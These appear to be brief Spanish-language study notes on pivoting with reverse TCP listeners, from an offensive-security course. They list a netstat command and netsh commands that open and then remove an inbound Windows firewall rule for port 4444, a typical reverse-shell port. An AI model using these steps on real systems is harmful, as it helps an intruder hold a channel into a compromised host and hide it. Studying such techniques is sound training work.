#PivotLosteners
Usa TCP pero al reves
Es independiente sin tener que conectarse
Pivoting>Listener
run netstat -anp tcp
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444











